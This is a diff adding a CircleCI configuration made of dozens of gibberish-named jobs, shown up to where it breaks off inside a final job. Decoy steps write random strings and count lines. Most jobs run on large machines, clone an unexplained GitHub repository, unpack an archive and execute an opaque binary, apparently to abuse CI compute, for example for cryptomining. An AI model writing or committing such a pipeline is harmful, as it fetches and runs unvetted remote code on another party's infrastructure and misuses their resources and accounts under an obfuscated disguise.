@@ -1,0 +1,1331 @@
+version: 2.1
+
+jobs:
+  nacco:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: amuand
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'xfsytagjznrnxuu qyvilevxdhrlffcap' > /tmp/ihiubyhbtfufcmx/pfigbfmpxowv
+            ls -la /tmp/ihiubyhbtfufcmx/pfigbfmpxowv
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'pfigbfmpxowv'
+  ewclyzlnwltkcti:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: gvgpqazoltubcvj
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/blbwzrj 2>/dev/null || true
+      - run:
+          name: dxpohoiwircflep
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: hsnfit
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: anybcgtkrk
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  ubhkbwtzn:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: uqojblqslh
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: ducerrofleexd
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: isgjtrpnygtjrn
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: uzyqjiipcu
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  mftdnw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: aarvtbt
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'mxyhafcgwrjved fvpkeujrfumy' > /tmp/ihiubyhbtfufcmx/aqrvdh
+            ls -la /tmp/ihiubyhbtfufcmx/aqrvdh
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'aqrvdh'
+  pxbew:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: mkncrbzyoxm
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/qvlxtklwduyb 2>/dev/null || true
+      - run:
+          name: hcmqmqbzbjch
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: owqwav
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: jqqde
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  dwcauvruyldq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: weydbcztdllrsye
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'tkfmkfopdmaxrkynhk mwxsndydkxeqvf' > /tmp/ihiubyhbtfufcmx/wgygkxsyiqve
+            ls -la /tmp/ihiubyhbtfufcmx/wgygkxsyiqve
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'wgygkxsyiqve'
+  gftllgtpijll:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: vaviggicuqvq
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/hdgtkror 2>/dev/null || true
+      - run:
+          name: agqoyvcayetv
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: vtsdqzucsv
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: noddkkv
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  cjgpxafv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: frwjera
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: maexdfzuvwkjkb
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: xmkklbdwwvmptg
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: iuwulpuqgxqkz
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  jcwpnqgd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: pdxfxvxdammblv
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'fyapgnffctwy nwhmcoanldjsz' > /tmp/ihiubyhbtfufcmx/rotjqhff
+            ls -la /tmp/ihiubyhbtfufcmx/rotjqhff
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'rotjqhff'
+  hgthxkl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: sztkbhk
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/virsslzshhayk 2>/dev/null || true
+      - run:
+          name: qcguapjbzccipsz
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: rkfmp
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: cqopuicl
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  yxvotuvp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: wdzjwitabhkfeu
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'dgrrwqgiplpph rwvnqreeevkcu' > /tmp/ihiubyhbtfufcmx/cgzmvnlwwcin
+            ls -la /tmp/ihiubyhbtfufcmx/cgzmvnlwwcin
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'cgzmvnlwwcin'
+  kxtuvin:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: iavlojrf
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/dtdrqafg 2>/dev/null || true
+      - run:
+          name: xpavpzuobzkd
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: swvhrzboipc
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: hsiiz
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  weboqzl:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: vlwfkxqtujimht
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: hyvofa
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: dapveanvaagh
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: bifevf
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  zfyvtyh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: fafvymcbcarof
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'apfcjcbokkphqkjfic octqzatyhtq' > /tmp/ihiubyhbtfufcmx/ckzcyxscwvc
+            ls -la /tmp/ihiubyhbtfufcmx/ckzcyxscwvc
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'ckzcyxscwvc'
+  xsihlnluqqif:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: cuqfq
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/faybcrehrxopb 2>/dev/null || true
+      - run:
+          name: jnnzextlync
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: mefquwsti
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: xxbnegvo
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  zjomlkufpaae:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: rbmwqjrgyqdmn
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'rzmmljqdxpmpfr nvzxsjobylehpzfzvn' > /tmp/ihiubyhbtfufcmx/qcohudpwpqumqc
+            ls -la /tmp/ihiubyhbtfufcmx/qcohudpwpqumqc
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'qcohudpwpqumqc'
+  epmjtkcpwae:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: bahlqmrexuv
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/tpjwjwhebtfi 2>/dev/null || true
+      - run:
+          name: vxlpuuezxao
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: syunc
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: vqkhpne
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  oojixhdtfbbnk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: lwspocf
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'ebfhhfnoyofk pupqoxdqiadptupjcy' > /tmp/ihiubyhbtfufcmx/haypybmylcg
+            ls -la /tmp/ihiubyhbtfufcmx/haypybmylcg
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'haypybmylcg'
+  ccvibh:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: jqtavj
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/lukymzythj 2>/dev/null || true
+      - run:
+          name: fbvqkvba
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: irrkyrxs
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: jfzhsewapgn
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  wtzjcqwisqz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: wxegqhfkehnp
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'ypwdoqhham ijlclrtslycgpmx' > /tmp/ihiubyhbtfufcmx/emklownuz
+            ls -la /tmp/ihiubyhbtfufcmx/emklownuz
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'emklownuz'
+  bdarzytkdytyrju:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: zlgtjcxoozh
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/hncdfxyqrgtwgs 2>/dev/null || true
+      - run:
+          name: msioqjizcy
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: rhwelnhr
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: pqfckwjyvyf
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  uyrzfhpjhynwf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: gpuymiwalocu
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'edhueroofanye shdsqqwpkzswaks' > /tmp/ihiubyhbtfufcmx/gepsfitxf
+            ls -la /tmp/ihiubyhbtfufcmx/gepsfitxf
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'gepsfitxf'
+  asryuzsserweeb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: knfbq
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/toijxb 2>/dev/null || true
+      - run:
+          name: orfyshcmdhd
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: nflhlwxkmcvdycg
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: jomlkelpbw
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  jtxssvifgun:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: icdbbal
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'cbzvymhcqgm yrcyfbohdv' > /tmp/ihiubyhbtfufcmx/bjblzouopotkup
+            ls -la /tmp/ihiubyhbtfufcmx/bjblzouopotkup
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'bjblzouopotkup'
+  ehiogvlusluff:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: nsyhuxyphb
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/zangpetoktgp 2>/dev/null || true
+      - run:
+          name: vhcytsilmnugwte
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: shbjarczatb
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: eqlubltwv
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  qievddirfkth:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: xmhweoqbm
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: wdxsgdzvlnb
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: vmgzwpzfsrmtc
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: xlebxzdqrwvlasd
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  jioloxpllezaky:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: dwihvhdw
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'jzsmewqjorvp muoiuhbhyrehpqdbwe' > /tmp/ihiubyhbtfufcmx/mnamksllmfvr
+            ls -la /tmp/ihiubyhbtfufcmx/mnamksllmfvr
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'mnamksllmfvr'
+  tjosjojuzss:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: xgvykcngi
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: kkfolh
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: njahzvnxsekk
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: aszveeajodbypn
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  gqyogbk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: ddgrzpyabojxea
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'rrxbkjzopostow idpucmjpjnhoulol' > /tmp/ihiubyhbtfufcmx/yjeppfmc
+            ls -la /tmp/ihiubyhbtfufcmx/yjeppfmc
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'yjeppfmc'
+  blqsgapwv:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: xvrmulolmngtpz
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/kgyprfxeimnvcl 2>/dev/null || true
+      - run:
+          name: ulyrqbxouh
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: wsxwvergdvqpkwf
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: abijkyulxtxx
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  qojhdojifcflxpv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: qycmmxadaymy
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'fysozqhrudbuife xukqrvxkncwfeqnv' > /tmp/ihiubyhbtfufcmx/vttfyk
+            ls -la /tmp/ihiubyhbtfufcmx/vttfyk
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'vttfyk'
+  zxlxzlp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: qqphpqunuilfox
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/nzeoylzxnzpdb 2>/dev/null || true
+      - run:
+          name: usgvbvogkg
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: iydovvkf
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: kvfkdgjjfaik
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  fwgkuow:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: hunzhxcvs
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: aasygppggtkkbce
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: seupvtozplatie
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: tlaxxvmsrrbfqvx
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  bmddlxvyyfdom:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: szpfppjmjdoejnr
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'ogvdmvlyaezstg lhyoxfednxwpux' > /tmp/ihiubyhbtfufcmx/fzwazqhofo
+            ls -la /tmp/ihiubyhbtfufcmx/fzwazqhofo
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'fzwazqhofo'
+  yjxdgjltoyrhb:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: sarui
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/qjhcnl 2>/dev/null || true
+      - run:
+          name: otfrwsset
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: chxhfznhybhlkj
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: qusigneqmjwmg
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  qwzkxwwqmbz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: scckwgufqdu
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'musxqhiwkfeyyq vsbmkkxxrpbbsdkbeb' > /tmp/ihiubyhbtfufcmx/yigoyhdccfrj
+            ls -la /tmp/ihiubyhbtfufcmx/yigoyhdccfrj
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'yigoyhdccfrj'
+  chvwndixczriwps:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: wpnkrctvw
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/hkcnwx 2>/dev/null || true
+      - run:
+          name: eeubrxkmdverks
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: ndfaqhorixe
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: ghyqxme
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  lqnixvdqf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: tgiihyjqpex
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: lxhfdhmcrr
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: kyhxh
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: gdozhyshglxoxw
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  ddeghj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: edpydpimrf
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: ycqpjztfcjkyron
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: xsetj
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: bmloemx
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  kqogistzzlnnbe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: fbkefhmm
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'vznsbpfkkrxdkjpy onlcfoebucbyo' > /tmp/ihiubyhbtfufcmx/tqchth
+            ls -la /tmp/ihiubyhbtfufcmx/tqchth
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'tqchth'
+  ocswi:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: axnxeijsyvhj
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/nbjucqjqau 2>/dev/null || true
+      - run:
+          name: ovlkobzwweynytu
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: tgrcitaguj
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: reoqdguvteunk
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  hriwelylashrbm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pzmovanqxc
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'vkbjjknchvmurpxmxu baichcotpoov' > /tmp/ihiubyhbtfufcmx/yknvtlyq
+            ls -la /tmp/ihiubyhbtfufcmx/yknvtlyq
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'yknvtlyq'
+  wbbjkjpazcx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: fpkkctlkyeht
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/kiaulndxwx 2>/dev/null || true
+      - run:
+          name: nxjozyucybri
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: kuuxvggty
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: beujlnpsxbpmhxk
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  ifavebitzeimqsj:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: vulayvf
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: pfxcbexogd
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: ihukmr
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: kivjjjswmm
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  xbbxpxrkhxaap:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: qslouyhlkdhq
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'bfchdnyxlyv exmsikhejjegd' > /tmp/ihiubyhbtfufcmx/cuugvzes
+            ls -la /tmp/ihiubyhbtfufcmx/cuugvzes
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'cuugvzes'
+  utpsbncudztt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: xuymxsnzp
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cwoyrhhv 2>/dev/null || true
+      - run:
+          name: blkhko
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: mtacqpzvwddtj
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: mgxsrv
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  xqdpnkygyhoimc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: bkkkmui
+          command: |
+            mkdir -p /tmp/ihiubyhbtfufcmx
+            echo 'nfsvnchqwectm zsfxayemtumqbdctpc' > /tmp/ihiubyhbtfufcmx/tmvbqgn
+            ls -la /tmp/ihiubyhbtfufcmx/tmvbqgn
+      - persist_to_workspace:
+          root: /tmp/ihiubyhbtfufcmx
+          paths:
+            - 'tmvbqgn'
+  mvoabomfdrloulz:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: rzioqegcvons
+          command: |
+            grep -cE '[A-Za-z]' /tmp/ihiubyhbtfufcmx/cidqbpo 2>/dev/null || true
+      - run:
+          name: kreiwadxzufogcu
+          command: git clone --depth 2 --single-branch https://github.com/janiahorn75im3-beep/3b351a84aef8 .
+      - run:
+          name: nddudhx
+          command: tar -xJf quhlwvosqiov.tar.xz
+      - run:
+          name: vqxtsxbhbi
+          command: du -sh .
+      - run:
+          command: $PWD/uvirpjuwsijn
+  tgcnagohazen:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ihiubyhbtfufcmx
+      - run:
+          name: zfoozfz
+          command: |
